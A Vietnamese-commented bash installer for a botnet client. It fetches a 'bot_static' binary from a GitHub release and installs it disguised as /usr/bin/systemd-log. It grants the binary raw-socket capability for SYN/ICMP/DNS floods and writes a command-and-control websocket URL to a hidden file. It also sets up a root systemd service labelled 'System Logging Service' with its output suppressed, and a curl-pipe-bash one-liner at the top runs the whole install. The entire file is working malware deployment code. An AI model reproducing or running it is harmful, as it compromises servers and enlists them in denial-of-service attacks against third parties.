#!/bin/bash
# ============================================================
# BOT DEPLOYER — repo PUBLIC, không cần token
# ============================================================
# curl -sL https://raw.githubusercontent.com/duaakcon10/dc-ansta/main/install.sh | bash -s wss://bot.minhvuong.io.vn/ws/bot/
# ============================================================
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo "[*] $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[✗]${NC} $1"; }

C2_URL="${1:-wss://bot.minhvuong.io.vn/ws/bot/}"
GITHUB_REPO="duaakcon10/dc-ansta"
BOT_PATH="/usr/bin/systemd-log"
C2_CFG="/etc/.bot_c2"

case "$C2_URL" in
    wss://*|ws://*) ;;
    *) C2_URL="wss://${C2_URL}" ;;
esac
if [[ "$C2_URL" != *"/ws/"* ]]; then
    C2_URL="${C2_URL%/}/ws/bot/"
fi

info "C2 URL : $C2_URL"
info "Repo   : github.com/$GITHUB_REPO"

# ── Find latest release ──────────────────────────
API_URL="https://api.github.com/repos/$GITHUB_REPO/releases/latest"
info "Fetching latest release..."

LATEST=$(curl -fs "$API_URL" 2>/dev/null | grep '"tag_name"' | head -1 | cut -d'"' -f4) || true

if [ -z "$LATEST" ]; then
    # Sometimes API rate-limited → try listing releases
    info "Primary API empty, trying releases list..."
    LATEST=$(curl -fs "https://api.github.com/repos/$GITHUB_REPO/releases?per_page=1" 2>/dev/null | grep '"tag_name"' | head -1 | cut -d'"' -f4) || true
fi

if [ -z "$LATEST" ]; then
    err "Không tìm thấy release nào trên GitHub."
    echo ""
    echo "  Đảm bảo bạn đã push tag v* để trigger build:"
    echo "    cd BOT-GITHUB"
    echo "    git tag v4.0.2 && git push origin v4.0.2"
    echo ""
    echo "  Hoặc nếu có binary sẵn, chạy manual:"
    echo "    /usr/bin/systemd-log wss://YOUR_HOST/ws/bot/"
    exit 1
fi

ok "Latest release: $LATEST"

# ── Download binary ──────────────────────────────
DOWNLOAD_URL="https://github.com/$GITHUB_REPO/releases/download/$LATEST/bot_static"
info "Downloading $DOWNLOAD_URL"
curl -fL "$DOWNLOAD_URL" -o /tmp/bot_update || {
    err "Download failed. URL: $DOWNLOAD_URL"
    echo "  Kiểm tra: Actions đã build xong chưa? Vào GitHub Releases để xem."
    exit 1
}
chmod +x /tmp/bot_update
ok "Downloaded $(du -h /tmp/bot_update | cut -f1)"

# ── Install ──────────────────────────────────────
info "Installing to $BOT_PATH"
systemctl stop systemd-log.service 2>/dev/null || true
killall systemd-log 2>/dev/null || true
sleep 0.5

mv /tmp/bot_update "$BOT_PATH"
chmod +x "$BOT_PATH"
setcap cap_net_raw+ep "$BOT_PATH" 2>/dev/null || warn "setcap failed (SYN/ICMP/DNS sẽ không hoạt động)"

echo "$C2_URL" > "$C2_CFG"
chmod 600 "$C2_CFG" 2>/dev/null || true

# ── systemd persistence ──────────────────────────
cat > /etc/systemd/system/systemd-log.service << SERVICE
[Unit]
Description=System Logging Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${BOT_PATH} ${C2_URL}
Restart=always
RestartSec=10
User=root
WorkingDirectory=/
StandardOutput=null
StandardError=null
LimitNOFILE=1048576

[Install]
WantedBy=multi-user.target
SERVICE

systemctl daemon-reload
systemctl enable systemd-log.service
systemctl restart systemd-log.service

sleep 1
if systemctl is-active --quiet systemd-log.service; then
    ok "Bot service ACTIVE"
else
    warn "systemd not active — running foreground lần cuối..."
    nohup "$BOT_PATH" "$C2_URL" &>/dev/null &
    sleep 1
    if pgrep -f systemd-log > /dev/null; then
        ok "Bot running (nohup)"
    else
        warn "Bot chưa chạy. Chạy tay để debug:"
        echo "  ${BOT_PATH} ${C2_URL} --foreground"
    fi
fi

echo ""
echo "============================================"
ok "Cài đặt hoàn tất."
echo "  C2        : $C2_URL"
echo "  Binary    : $BOT_PATH"
echo "  Status    : systemctl status systemd-log"
echo "  Logs      : journalctl -u systemd-log -f"
echo "  Debug     : ${BOT_PATH} ${C2_URL} --foreground"
